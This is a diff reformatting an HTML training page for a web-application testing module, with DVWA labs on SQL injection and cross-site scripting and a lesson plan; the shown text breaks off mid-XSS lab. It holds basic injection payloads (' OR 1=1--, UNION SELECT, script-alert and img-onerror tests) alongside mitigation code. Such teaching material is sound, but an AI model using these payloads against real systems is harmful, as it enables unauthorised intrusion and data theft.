@@ -1,5 +1,6 @@
 <!doctype html>
 <html lang="en">
+
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
@@ -9,373 +10,454 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     /* Fallback to ensure visible content even if CSS variables are unsupported */
-    body{background:#fff;color:#111;}
-    :root{
-      --accent:#0b5cff;
-      --accent-hover:#0a4fd9;
-      --muted:#666;
-      --bg:#f7f9fc;
-      --card-bg:#fafbfd;
-      --success:#10b981;
-      --warning:#f59e0b;
-      --error:#ef4444;
-      --sidebar-width:280px;
-      --shadow:0 4px 20px rgba(0,0,0,0.05);
+    body {
+      background: #fff;
+      color: #111;
     }
-    * {box-sizing: border-box;}
-    body{
-      font-family:'Inter', sans-serif;
-      line-height:1.6;
-      background:var(--bg);
-      color:#111;
-      margin:0;
-      padding:0;
+
+    :root {
+      --accent: #0b5cff;
+      --accent-hover: #0a4fd9;
+      --muted: #666;
+      --bg: #f7f9fc;
+      --card-bg: #fafbfd;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --error: #ef4444;
+      --sidebar-width: 280px;
+      --shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
     }
-    .layout{
-      display:flex;
-      min-height:100vh;
+
+    * {
+      box-sizing: border-box;
     }
-    .sidebar{
-      width:var(--sidebar-width);
-      background:#fff;
-      border-right:1px solid #e6eef8;
-      padding:24px 16px;
-      position:fixed;
-      height:100vh;
-      overflow-y:auto;
-      z-index:100;
-      box-shadow:var(--shadow);
-      transition:transform 0.3s ease;
+
+    body {
+      font-family: 'Inter', sans-serif;
+      line-height: 1.6;
+      background: var(--bg);
+      color: #111;
+      margin: 0;
+      padding: 0;
     }
-    .sidebar h2{
-      font-size:18px;
-      margin:0 0 16px;
-      color:#111;
+
+    .layout {
+      display: flex;
+      min-height: 100vh;
     }
-    .nav-item{
-      display:flex;
-      align-items:center;
-      padding:10px 12px;
-      margin:4px 0;
-      border-radius:8px;
-      color:#444;
-      text-decoration:none;
-      font-size:14px;
-      transition:all 0.2s ease;
-      cursor:pointer;
-      border:none;
-      background:transparent;
-      width:100%;
-      text-align:left;
+
+    .sidebar {
+      width: var(--sidebar-width);
+      background: #fff;
+      border-right: 1px solid #e6eef8;
+      padding: 24px 16px;
+      position: fixed;
+      height: 100vh;
+      overflow-y: auto;
+      z-index: 100;
+      box-shadow: var(--shadow);
+      transition: transform 0.3s ease;
     }
-    .nav-item:hover{
-      background:#f0f4ff;
-      color:var(--accent);
+
+    .sidebar h2 {
+      font-size: 18px;
+      margin: 0 0 16px;
+      color: #111;
     }
-    .nav-item.active{
-      background:var(--accent);
-      color:white;
-      font-weight:500;
+
+    .nav-item {
+      display: flex;
+      align-items: center;
+      padding: 10px 12px;
+      margin: 4px 0;
+      border-radius: 8px;
+      color: #444;
+      text-decoration: none;
+      font-size: 14px;
+      transition: all 0.2s ease;
+      cursor: pointer;
+      border: none;
+      background: transparent;
+      width: 100%;
+      text-align: left;
     }
-    .nav-item.completed{
-      color:var(--success);
+
+    .nav-item:hover {
+      background: #f0f4ff;
+      color: var(--accent);
     }
-    .nav-item.completed::after{
-      content:' ✓';
-      margin-left:auto;
-      font-weight:bold;
+
+    .nav-item.active {
+      background: var(--accent);
+      color: white;
+      font-weight: 500;
     }
-    .nav-icon{
-      margin-right:8px;
-      font-size:16px;
+
+    .nav-item.completed {
+      color: var(--success);
     }
-    .main-content{
-      margin-left:var(--sidebar-width);
-      flex:1;
-      padding:48px 32px;
-      max-width:1200px;
+
+    .nav-item.completed::after {
+      content: ' ✓';
+      margin-left: auto;
+      font-weight: bold;
     }
-    .section{
-      display:none;
-      animation:fadeIn 0.3s ease;
+
+    .nav-icon {
+      margin-right: 8px;
+      font-size: 16px;
     }
-    .section.active{
-      display:block;
+
+    .main-content {
+      margin-left: var(--sidebar-width);
+      flex: 1;
+      padding: 48px 32px;
+      max-width: 1200px;
     }
-    @keyframes fadeIn{
-      from{opacity:0;transform:translateY(10px)}
-      to{opacity:1;transform:translateY(0)}
+
+    .section {
+      display: none;
+      animation: fadeIn 0.3s ease;
     }
-    .header{
-      background:#fff;
-      padding:32px;
-      border-radius:12px;
-      box-shadow:var(--shadow);
-      margin-bottom:32px;
+
+    .section.active {
+      display: block;
     }
-    h1{
-      margin:0 0 8px;
-      font-size:32px;
-      font-weight:700;
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
     }
-    h2{
-      color:var(--accent);
-      margin-top:40px;
-      margin-bottom:16px;
-      font-size:24px;
-      font-weight:600;
+
+    .header {
+      background: #fff;
+      padding: 32px;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      margin-bottom: 32px;
     }
-    h3{
-      margin-top:32px;
-      margin-bottom:12px;
-      font-size:18px;
-      font-weight:600;
+
+    h1 {
+      margin: 0 0 8px;
+      font-size: 32px;
+      font-weight: 700;
     }
-    p.lead{
-      color:var(--muted);
-      margin-top:6px;
-      font-size:16px;
+
+    h2 {
+      color: var(--accent);
+      margin-top: 40px;
+      margin-bottom: 16px;
+      font-size: 24px;
+      font-weight: 600;
     }
-    .card{
-      background:#fff;
-      padding:24px;
-      border-radius:12px;
-      box-shadow:var(--shadow);
-      margin-bottom:24px;
+
+    h3 {
+      margin-top: 32px;
+      margin-bottom: 12px;
+      font-size: 18px;
+      font-weight: 600;
     }
-    .small{
-      font-size:13px;
-      color:var(--muted);
+
+    p.lead {
+      color: var(--muted);
+      margin-top: 6px;
+      font-size: 16px;
     }
-    table{
-      width:100%;
-      border-collapse:collapse;
-      margin-top:12px;
-      font-size:14px;
-      background:#fff;
-      border-radius:8px;
-      overflow:hidden;
+
+    .card {
+      background: #fff;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      margin-bottom: 24px;
     }
-    table td,table th{
-      border:1px solid #e6eef8;
-      padding:12px;
-      text-align:left;
+
+    .small {
+      font-size: 13px;
+      color: var(--muted);
     }
-    table th{
-      background:#f8fafc;
-      font-weight:600;
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 12px;
+      font-size: 14px;
+      background: #fff;
+      border-radius: 8px;
+      overflow: hidden;
     }
-    code,pre{
-      font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;
-      background:#0f1724;
-      color:#f8fafc;
-      padding:12px;
-      border-radius:6px;
-      display:block;
-      white-space:pre-wrap;
-      font-size:13px;
-      line-height:1.5;
-      margin:8px 0;
-      overflow-x:auto;
+
+    table td,
+    table th {
+      border: 1px solid #e6eef8;
+      padding: 12px;
+      text-align: left;
     }
-    .btn{
-      display:inline-block;
-      padding:10px 20px;
-      background:var(--accent);
-      color:white;
-      border-radius:8px;
-      text-decoration:none;
-      font-weight:500;
-      transition:all 0.2s ease;
-      border:none;
-      cursor:pointer;
-      font-size:14px;
-      margin:4px;
-      box-shadow:0 2px 4px rgba(11,92,255,0.2);
+
+    table th {
+      background: #f8fafc;
+      font-weight: 600;
     }
-    .btn:hover{
-      background:var(--accent-hover);
-      transform:translateY(-1px);
-      box-shadow:0 4px 8px rgba(11,92,255,0.3);
+
+    code,
+    pre {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      background: #0f1724;
+      color: #f8fafc;
+      padding: 12px;
+      border-radius: 6px;
+      display: block;
+      white-space: pre-wrap;
+      font-size: 13px;
+      line-height: 1.5;
+      margin: 8px 0;
+      overflow-x: auto;
     }
-    .btn-secondary{
-      background:#64748b;
+
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
+      background: var(--accent);
+      color: white;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: 500;
+      transition: all 0.2s ease;
+      border: none;
+      cursor: pointer;
+      font-size: 14px;
+      margin: 4px;
+      box-shadow: 0 2px 4px rgba(11, 92, 255, 0.2);
     }
-    .btn-secondary:hover{
-      background:#475569;
+
+    .btn:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 8px rgba(11, 92, 255, 0.3);
     }
-    .btn:disabled{
-      background:#cbd5e1;
-      cursor:not-allowed;
-      transform:none;
+
+    .btn-secondary {
+      background: #64748b;
     }
-    .navigation-buttons{
-      display:flex;
-      justify-content:space-between;
-      margin-top:32px;
-      padding-top:24px;
-      border-top:2px solid #e6eef8;
+
+    .btn-secondary:hover {
+      background: #475569;
     }
-    ul{
-      line-height:1.8;
-      padding-left:24px;
+
+    .btn:disabled {
+      background: #cbd5e1;
+      cursor: not-allowed;
+      transform: none;
     }
-    li{
-      margin-bottom:8px;
+
+    .navigation-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 2px solid #e6eef8;
     }
-    .alert{
-      padding:14px 18px;
-      border-radius:8px;
-      margin:16px 0;
-      font-size:14px;
+
+    ul {
+      line-height: 1.8;
+      padding-left: 24px;
     }
-    .alert-warning{
-      background:#fef3c7;
-      border:1px solid #fbbf24;
-      color:#92400e;
+
+    li {
+      margin-bottom: 8px;
     }
-    .video-container{
-      position:relative;
-      padding-bottom:56.25%;
-      height:0;
-      overflow:hidden;
-      margin:16px 0;
-      border-radius:8px;
-      background:#000;
-      box-shadow:var(--shadow);
+
+    .alert {
+      padding: 14px 18px;
+      border-radius: 8px;
+      margin: 16px 0;
+      font-size: 14px;
     }
-    .video-container iframe{
-      position:absolute;
-      top:0;
-      left:0;
-      width:100%;
-      height:100%;
-      border:0;
+
+    .alert-warning {
+      background: #fef3c7;
+      border: 1px solid #fbbf24;
+      color: #92400e;
     }
-    .progress-indicator{
-      position:fixed;
-      top:0;
-      left:var(--sidebar-width);
-      right:0;
-      height:4px;
-      background:#e6eef8;
-      z-index:1000;
+
+    .video-container {
+      position: relative;
+      padding-bottom: 56.25%;
+      height: 0;
+      overflow: hidden;
+      margin: 16px 0;
+      border-radius: 8px;
+      background: #000;
+      box-shadow: var(--shadow);
     }
-    .progress-bar{
-      height:100%;
-      background:var(--accent);
-      width:0%;
-      transition:width 0.3s ease;
-      box-shadow:0 0 10px rgba(11,92,255,0.5);
+
+    .video-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: 0;
     }
-    .menu-toggle{
-      display:none;
-      position:fixed;
-      top:16px;
-      left:16px;
-      z-index:200;
-      background:var(--accent);
-      color:white;
-      border:none;
-      padding:10px 14px;
-      border-radius:8px;
-      cursor:pointer;
-      font-size:18px;
-      box-shadow:var(--shadow);
+
+    .progress-indicator {
+      position: fixed;
+      top: 0;
+      left: var(--sidebar-width);
+      right: 0;
+      height: 4px;
+      background: #e6eef8;
+      z-index: 1000;
     }
-    .close-toggle{
-      display:none;
-      position:absolute;
-      top:16px;
-      right:16px;
-      background:transparent;
-      color:#444;
-      border:none;
-      font-size:24px;
-      cursor:pointer;
+
+    .progress-bar {
+      height: 100%;
+      background: var(--accent);
+      width: 0%;
+      transition: width 0.3s ease;
+      box-shadow: 0 0 10px rgba(11, 92, 255, 0.5);
     }
-    .quiz .question{
-      margin-bottom:24px;
-      padding:16px;
-      background:#f8fafc;
-      border-radius:8px;
+
+    .menu-toggle {
+      display: none;
+      position: fixed;
+      top: 16px;
+      left: 16px;
+      z-index: 200;
+      background: var(--accent);
+      color: white;
+      border: none;
+      padding: 10px 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 18px;
+      box-shadow: var(--shadow);
     }
-    .quiz .options{
-      display:flex;
-      flex-direction:column;
+
+    .close-toggle {
+      display: none;
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: transparent;
+      color: #444;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
     }
-    .quiz label{
-      margin:4px 0;
-      cursor:pointer;
+
+    .quiz .question {
+      margin-bottom: 24px;
+      padding: 16px;
+      background: #f8fafc;
+      border-radius: 8px;
     }
-    .quiz .answer{
-      display:none;
-      margin-top:12px;
-      padding:8px;
-      border-radius:4px;
+
+    .quiz .options {
+      display: flex;
+      flex-direction: column;
     }
-    .quiz .answer.correct{
-      background:var(--success);
-      color:white;
+
+    .quiz label {
+      margin: 4px 0;
+      cursor: pointer;
     }
-    .quiz .answer.incorrect{
-      background:var(--error);
-      color:white;
+
+    .quiz .answer {
+      display: none;
+      margin-top: 12px;
+      padding: 8px;
+      border-radius: 4px;
     }
-    .quiz form{
-      margin-top:20px;
+
+    .quiz .answer.correct {
+      background: var(--success);
+      color: white;
     }
-    .quiz-result{
-      margin-top:20px;
-      padding:16px;
-      border-radius:8px;
-      font-weight:bold;
+
+    .quiz .answer.incorrect {
+      background: var(--error);
+      color: white;
     }
-    .quiz-result.pass{
-      background:var(--success);
-      color:white;
+
+    .quiz form {
+      margin-top: 20px;
     }
-    .quiz-result.fail{
-      background:var(--error);
-      color:white;
+
+    .quiz-result {
+      margin-top: 20px;
+      padding: 16px;
+      border-radius: 8px;
+      font-weight: bold;
     }
+
+    .quiz-result.pass {
+      background: var(--success);
+      color: white;
+    }
+
+    .quiz-result.fail {
+      background: var(--error);
+      color: white;
+    }
+
     @media (max-width: 968px) {
-      .sidebar{
-        transform:translateX(-100%);
+      .sidebar {
+        transform: translateX(-100%);
       }
-      .sidebar.open{
-        transform:translateX(0);
+
+      .sidebar.open {
+        transform: translateX(0);
       }
-      .main-content{
-        margin-left:0;
-        padding:80px 20px 20px;
+
+      .main-content {
+        margin-left: 0;
+        padding: 80px 20px 20px;
       }
-      .menu-toggle{
-        display:block;
+
+      .menu-toggle {
+        display: block;
       }
-      .close-toggle{
-        display:block;
+
+      .close-toggle {
+        display: block;
       }
     }
+
     @media print {
-      .sidebar,.navigation-buttons,.btn,.menu-toggle,.close-toggle{
-        display:none;
+
+      .sidebar,
+      .navigation-buttons,
+      .btn,
+      .menu-toggle,
+      .close-toggle {
+        display: none;
       }
-      .main-content{
-        margin-left:0;
-        padding:20px;
+
+      .main-content {
+        margin-left: 0;
+        padding: 20px;
       }
     }
   </style>
 </head>
+
 <body>
   <noscript>
-    <div style="background:#fff;color:#111;padding:16px;border-bottom:2px solid #e6eef8;text-align:center;font-family:Arial,Helvetica,sans-serif">
+    <div
+      style="background:#fff;color:#111;padding:16px;border-bottom:2px solid #e6eef8;text-align:center;font-family:Arial,Helvetica,sans-serif">
       JavaScript is disabled. Enable it to use navigation and the quiz. Static content below should still be visible.
     </div>
   </noscript>
   <button class="menu-toggle" onclick="toggleSidebar()">☰</button>
-  
+
   <div class="progress-indicator">
     <div class="progress-bar" id="progressBar"></div>
   </div>
@@ -384,14 +466,21 @@
     <nav class="sidebar" id="sidebar">
       <button class="close-toggle" onclick="toggleSidebar()">×</button>
       <h2>Week 9 - Web Application Testing</h2>
-      <button class="nav-item active" onclick="showSection('overview')"><span class="nav-icon">📜</span>Overview</button>
-      <button class="nav-item" onclick="showSection('outcomes')"><span class="nav-icon">🎯</span>Learning Outcomes</button>
-      <button class="nav-item" onclick="showSection('lesson-plan')"><span class="nav-icon">🗓️</span>Lesson Plan</button>
-      <button class="nav-item" onclick="showSection('video-tutorial')"><span class="nav-icon">🎥</span>Comprehensive Tutorial Video</button>
-      <button class="nav-item" onclick="showSection('lab1')"><span class="nav-icon">🧪</span>Lab 1: SQL Injection</button>
+      <button class="nav-item active" onclick="showSection('overview')"><span
+          class="nav-icon">📜</span>Overview</button>
+      <button class="nav-item" onclick="showSection('outcomes')"><span class="nav-icon">🎯</span>Learning
+        Outcomes</button>
+      <button class="nav-item" onclick="showSection('lesson-plan')"><span class="nav-icon">🗓️</span>Lesson
+        Plan</button>
+      <button class="nav-item" onclick="showSection('video-tutorial')"><span class="nav-icon">🎥</span>Comprehensive
+        Tutorial Video</button>
+      <button class="nav-item" onclick="showSection('lab1')"><span class="nav-icon">🧪</span>Lab 1: SQL
+        Injection</button>
       <button class="nav-item" onclick="showSection('lab2')"><span class="nav-icon">🧪</span>Lab 2: XSS</button>
-      <button class="nav-item" onclick="showSection('lab3')"><span class="nav-icon">🧪</span>Lab 3: Access Control</button>
-      <button class="nav-item" onclick="showSection('lab4')"><span class="nav-icon">🧪</span>Lab 4: JWT (Optional)</button>
+      <button class="nav-item" onclick="showSection('lab3')"><span class="nav-icon">🧪</span>Lab 3: Access
+        Control</button>
+      <button class="nav-item" onclick="showSection('lab4')"><span class="nav-icon">🧪</span>Lab 4: JWT
+        (Optional)</button>
       <button class="nav-item" onclick="showSection('quiz')"><span class="nav-icon">❓</span>Sample Quiz</button>
     </nav>
 
@@ -406,11 +495,14 @@
 
         <div class="card">
           <h2>Module Overview</h2>
-          <p>This module trains learners to identify, exploit in a controlled lab, and mitigate the most common web vulnerabilities (OWASP Top 10 — focus: Injection, XSS, Broken Access Control).</p>
-          <p>Labs use <strong>DVWA (Damn Vulnerable Web Application)</strong> and <strong>Burp Suite (Community Edition)</strong>.</p>
-          
+          <p>This module trains learners to identify, exploit in a controlled lab, and mitigate the most common web
+            vulnerabilities (OWASP Top 10 — focus: Injection, XSS, Broken Access Control).</p>
+          <p>Labs use <strong>DVWA (Damn Vulnerable Web Application)</strong> and <strong>Burp Suite (Community
+              Edition)</strong>.</p>
+
           <div class="alert alert-warning">
-            <strong>⚠️ Safety Warning:</strong> All exercises must be run in the lab VM / local DVWA environment. Never test on public or production systems without explicit written authorization.
+            <strong>⚠️ Safety Warning:</strong> All exercises must be run in the lab VM / local DVWA environment. Never
+            test on public or production systems without explicit written authorization.
           </div>
 
           <h3>What You'll Learn</h3>
@@ -434,19 +526,31 @@
           <h2>Learning Outcomes</h2>
           <p>By the end of this module, learners will be able to:</p>
           <ul>
-            <li><strong>Explain and map</strong> OWASP Top 10 categories relevant to web applications and APIs. The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</li>
-            <li><strong>Use security tools</strong> including Burp Suite, cURL, and terminal utilities to intercept and modify HTTP traffic. Understanding these tools is crucial as they form the backbone of web penetration testing.</li>
-            <li><strong>Exploit vulnerabilities</strong> including SQLi and XSS in a lab environment and document comprehensive Proof of Concept (PoC). Exploitation helps in understanding the impact, but always remember to focus on ethical practices.</li>
-            <li><strong>Design secure mitigations</strong> using prepared statements, output encoding, Content Security Policy (CSP), and authorization checks. Mitigation is as important as detection to prevent real-world attacks.</li>
-            <li><strong>Understand ethical implications</strong> of security testing and legal requirements. Always obtain permission and follow laws like CFAA.</li>
+            <li><strong>Explain and map</strong> OWASP Top 10 categories relevant to web applications and APIs. The
+              OWASP Top 10 is a standard awareness document for developers and web application security. It represents a
+              broad consensus about the most critical security risks to web applications.</li>
+            <li><strong>Use security tools</strong> including Burp Suite, cURL, and terminal utilities to intercept and
+              modify HTTP traffic. Understanding these tools is crucial as they form the backbone of web penetration
+              testing.</li>
+            <li><strong>Exploit vulnerabilities</strong> including SQLi and XSS in a lab environment and document
+              comprehensive Proof of Concept (PoC). Exploitation helps in understanding the impact, but always remember
+              to focus on ethical practices.</li>
+            <li><strong>Design secure mitigations</strong> using prepared statements, output encoding, Content Security
+              Policy (CSP), and authorization checks. Mitigation is as important as detection to prevent real-world
+              attacks.</li>
+            <li><strong>Understand ethical implications</strong> of security testing and legal requirements. Always
+              obtain permission and follow laws like CFAA.</li>
           </ul>
 
           <h3>Prerequisites</h3>
           <ul>
-            <li>Basic understanding of HTTP protocol (GET, POST, headers, cookies). HTTP is the foundation of data communication on the web, and knowing its components is essential for identifying vulnerabilities.</li>
-            <li>Familiarity with HTML and JavaScript. These are client-side technologies often exploited in XSS attacks.</li>
+            <li>Basic understanding of HTTP protocol (GET, POST, headers, cookies). HTTP is the foundation of data
+              communication on the web, and knowing its components is essential for identifying vulnerabilities.</li>
+            <li>Familiarity with HTML and JavaScript. These are client-side technologies often exploited in XSS attacks.
+            </li>
             <li>Basic command line skills. Comfort with terminals speeds up tool usage like cURL.</li>
-            <li>Understanding of database fundamentals (SQL). SQL knowledge helps in crafting and understanding injection attacks.</li>
+            <li>Understanding of database fundamentals (SQL). SQL knowledge helps in crafting and understanding
+              injection attacks.</li>
           </ul>
         </div>
 
@@ -460,7 +564,8 @@
       <section class="section" id="lesson-plan">
         <div class="card">
           <h2>Detailed Lesson Plan (4 hours)</h2>
-          <p>This plan provides a structured approach to learning, combining theory with practical demos. Each segment builds on the previous, ensuring a logical flow from basics to advanced exploitation and mitigation.</p>
+          <p>This plan provides a structured approach to learning, combining theory with practical demos. Each segment
+            builds on the previous, ensuring a logical flow from basics to advanced exploitation and mitigation.</p>
           <table>
             <thead>
               <tr>
@@ -473,17 +578,20 @@
               <tr>
                 <td><strong>09:00–09:20</strong></td>
                 <td>Introduction: HTTP, Sessions, OWASP Top 10</td>
-                <td>Explain GET/POST, cookies, tokens. Show OWASP Top 10 page and introductory video. Discuss why OWASP Top 10 is updated periodically to reflect evolving threats.</td>
+                <td>Explain GET/POST, cookies, tokens. Show OWASP Top 10 page and introductory video. Discuss why OWASP
+                  Top 10 is updated periodically to reflect evolving threats.</td>
               </tr>
               <tr>
                 <td><strong>09:20–09:50</strong></td>
                 <td>Demo: Burp Suite & cURL</td>
-                <td>Route browser via Burp Proxy; intercept a login request; show cURL equivalents and analyze response headers/cookies. Emphasize how intercepting traffic reveals hidden parameters.</td>
+                <td>Route browser via Burp Proxy; intercept a login request; show cURL equivalents and analyze response
+                  headers/cookies. Emphasize how intercepting traffic reveals hidden parameters.</td>
               </tr>
               <tr>
                 <td><strong>09:50–10:35</strong></td>
                 <td>Lab 1 — SQL Injection (DVWA)</td>
-                <td>Guided PoC, move request to Repeater, extract sample data, document mitigation strategies. Highlight common errors like forgetting to comment out queries.</td>
+                <td>Guided PoC, move request to Repeater, extract sample data, document mitigation strategies. Highlight
+                  common errors like forgetting to comment out queries.</td>
               </tr>
               <tr>
                 <td><strong>10:35–10:45</strong></td>
@@ -493,12 +601,14 @@
               <tr>
                 <td><strong>10:45–11:20</strong></td>
                 <td>Lab 2 — XSS (Reflected & Stored)</td>
-                <td>Inject harmless payloads, explain cookie theft concept; demonstrate CSP and encoding fixes. Discuss why XSS is persistent and dangerous in modern apps.</td>
+                <td>Inject harmless payloads, explain cookie theft concept; demonstrate CSP and encoding fixes. Discuss
+                  why XSS is persistent and dangerous in modern apps.</td>
               </tr>
               <tr>
                 <td><strong>11:20–11:40</strong></td>
                 <td>Lab 3 — Broken Access Control / IDOR</td>
-                <td>Parameter tampering demonstration; explain server-side checks to enforce authorization. Cover real-world examples like data leaks from IDOR.</td>
+                <td>Parameter tampering demonstration; explain server-side checks to enforce authorization. Cover
+                  real-world examples like data leaks from IDOR.</td>
               </tr>
               <tr>
                 <td><strong>11:40–12:00</strong></td>
@@ -519,13 +629,18 @@
       <section class="section" id="video-tutorial">
         <div class="card">
           <h2>Comprehensive Tutorial Video</h2>
-          <p>This video provides a full course on web application penetration testing, covering key topics like setting up tools, XSS, CSRF, SQL Injection, and more using DVWA and Burp Suite. It's an excellent resource to reinforce the concepts from the lesson plan and labs.</p>
-          
+          <p>This video provides a full course on web application penetration testing, covering key topics like setting
+            up tools, XSS, CSRF, SQL Injection, and more using DVWA and Burp Suite. It's an excellent resource to
+            reinforce the concepts from the lesson plan and labs.</p>
+
           <div class="video-container">
-            <iframe src="https://www.youtube.com/embed/2_lswM1S264" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe src="https://www.youtube.com/embed/2_lswM1S264"
+              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+              allowfullscreen></iframe>
           </div>
 
-          <p>Watch this video to see practical demonstrations and deepen your understanding before diving into the hands-on labs.</p>
+          <p>Watch this video to see practical demonstrations and deepen your understanding before diving into the
+            hands-on labs.</p>
         </div>
 
         <div class="navigation-buttons">
@@ -538,32 +653,46 @@
       <section class="section" id="lab1">
         <div class="card">
           <h2>Lab 1 — SQL Injection (45 minutes)</h2>
-          
+
           <h3>Objective</h3>
-          <p>Learn to identify and exploit SQL injection vulnerabilities, understand their impact, and implement proper mitigations. SQL injection occurs when user input is improperly sanitized, allowing attackers to manipulate database queries. This can lead to data leakage, modification, or even full system compromise.</p>
+          <p>Learn to identify and exploit SQL injection vulnerabilities, understand their impact, and implement proper
+            mitigations. SQL injection occurs when user input is improperly sanitized, allowing attackers to manipulate
+            database queries. This can lead to data leakage, modification, or even full system compromise.</p>
 
           <h3>Setup Instructions</h3>
           <ol>
-            <li>Install DVWA locally or run the provided VM (available on DVWA GitHub). Ensure PHP and MySQL are set up correctly.</li>
-            <li>Set <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">DVWA Security</code> level to <em>LOW</em> to start with basic vulnerabilities.</li>
+            <li>Install DVWA locally or run the provided VM (available on DVWA GitHub). Ensure PHP and MySQL are set up
+              correctly.</li>
+            <li>Set <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">DVWA Security</code>
+              level to <em>LOW</em> to start with basic vulnerabilities.</li>
             <li>Open Burp Suite (Community Edition) and configure it as a proxy.</li>
-            <li>Configure your browser proxy to <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">localhost:8080</code>. Test by intercepting a request.</li>
+            <li>Configure your browser proxy to <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">localhost:8080</code>.
+              Test by intercepting a request.</li>
           </ol>
 
           <h3>Step-by-Step Exploitation</h3>
-          <p>SQL injection exploits often involve breaking out of the intended query structure. For example, in a query like SELECT * FROM users WHERE id = '$input', injecting ' OR 1=1-- alters it to always true.</p>
+          <p>SQL injection exploits often involve breaking out of the intended query structure. For example, in a query
+            like SELECT * FROM users WHERE id = '$input', injecting ' OR 1=1-- alters it to always true.</p>
           <ol>
             <li>Navigate to DVWA → <strong>SQL Injection</strong> module.</li>
             <li>Intercept the request using Burp Proxy or send directly to Repeater.</li>
-            <li>Test with basic payload: <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">' OR 1=1-- </code>. This closes the quote, adds a true condition, and comments out the rest.</li>
+            <li>Test with basic payload: <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">' OR 1=1-- </code>.
+              This closes the quote, adds a true condition, and comments out the rest.</li>
             <li>Observe authentication bypass or response differences. If successful, it dumps all users.</li>
-            <li>Try extracting table values using union-based techniques, e.g., <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">' UNION SELECT database(), user()-- </code> to get DB info.</li>
+            <li>Try extracting table values using union-based techniques, e.g., <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">' UNION SELECT database(), user()-- </code>
+              to get DB info.</li>
             <li>Document your findings with screenshots, including request/response in Burp.</li>
           </ol>
-          <p>Common mistakes: Forgetting the space after --, or not handling different DBMS syntax (MySQL vs. PostgreSQL).</p>
+          <p>Common mistakes: Forgetting the space after --, or not handling different DBMS syntax (MySQL vs.
+            PostgreSQL).</p>
 
           <h3>Mitigation Strategies</h3>
-          <p><strong>Primary Defense:</strong> Use prepared statements (parameterized queries) to separate code from data.</p>
+          <p><strong>Primary Defense:</strong> Use prepared statements (parameterized queries) to separate code from
+            data.</p>
           <pre>// Vulnerable code (PHP)
 $query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
 
@@ -576,7 +705,8 @@ cursor.execute("SELECT * FROM users WHERE username = ?", (username,))</pre>
 
           <p><strong>Additional Defenses:</strong></p>
           <ul>
-            <li>Input validation and sanitization: Use whitelists for expected formats, e.g., integers only for IDs.</li>
+            <li>Input validation and sanitization: Use whitelists for expected formats, e.g., integers only for IDs.
+            </li>
             <li>Least privilege database accounts: Limit DB user to SELECT/INSERT as needed, no DROP.</li>
             <li>Web Application Firewall (WAF) rules: Detect patterns like ' OR 1=1.</li>
             <li>Regular security audits: Use tools like SQLMap for automated testing.</li>
@@ -594,43 +724,59 @@ cursor.execute("SELECT * FROM users WHERE username = ?", (username,))</pre>
       <section class="section" id="lab2">
         <div class="card">
           <h2>Lab 2 — Cross-Site Scripting (XSS) (30 minutes)</h2>
-          
+
           <h3>Objective</h3>
-          <p>Understand reflected and stored XSS vulnerabilities, their exploitation techniques, and effective countermeasures. XSS allows attackers to inject client-side scripts into web pages viewed by other users, potentially stealing data or defacing sites. It's one of the most common web vulnerabilities due to improper output encoding.</p>
+          <p>Understand reflected and stored XSS vulnerabilities, their exploitation techniques, and effective
+            countermeasures. XSS allows attackers to inject client-side scripts into web pages viewed by other users,
+            potentially stealing data or defacing sites. It's one of the most common web vulnerabilities due to improper
+            output encoding.</p>
 
           <h3>Part A: Reflected XSS</h3>
-          <p>Reflected XSS occurs when user input is immediately returned in the response without sanitization, often via URL parameters.</p>
+          <p>Reflected XSS occurs when user input is immediately returned in the response without sanitization, often
+            via URL parameters.</p>
           <ol>
             <li>Navigate to DVWA → <strong>XSS (Reflected)</strong>.</li>
-            <li>Inject test payload: <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>. If it pops an alert, it's vulnerable.</li>
-            <li>Use Burp Repeater to test variations, like <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;img src="x" onerror="alert('XSS')"&gt;</code> for event-based.</li>
+            <li>Inject test payload: <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>.
